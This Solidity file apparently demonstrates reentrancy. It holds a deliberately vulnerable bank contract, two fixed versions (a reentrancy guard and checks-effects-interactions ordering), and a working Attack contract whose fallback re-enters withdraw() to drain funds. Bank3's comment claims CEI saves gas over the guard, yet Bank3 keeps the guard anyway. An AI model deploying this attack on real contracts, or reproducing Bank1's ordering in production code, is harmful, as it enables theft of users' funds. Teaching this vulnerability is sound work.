// SPDX-License-Identifier: MIT
// Written by Rohin Knight
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

abstract contract ABank {
    mapping(address => uint256) internal _balances;

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
    }

    function withdraw() external virtual;
}

// Vulnerable contract
contract Bank1 is ABank {
    function withdraw() external override {
        uint256 balance = _balances[msg.sender];
        
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "withdraw failed");
        
        _balances[msg.sender] = 0;
    }
}

// Contract using Reentrancy Guard
contract Bank2 is ABank, ReentrancyGuard {
    function withdraw() external override nonReentrant {
        uint256 balance = _balances[msg.sender];
        
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "withdraw failed");
        
        _balances[msg.sender] = 0;
    }
}

// Contract using CEI (Checks, Effects, Interactions) pattern
// Attacker's balance is updated before eth is sent
// Uses less gas than Reentrancy Guard
contract Bank3 is ABank, ReentrancyGuard {
    function withdraw() external override nonReentrant {
        uint256 balance = _balances[msg.sender];
        _balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "withdraw failed");
    }
}

contract Attack {
    ABank private bank;

    constructor(address bankAddress) {
        bank = ABank(bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= 0.01 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}
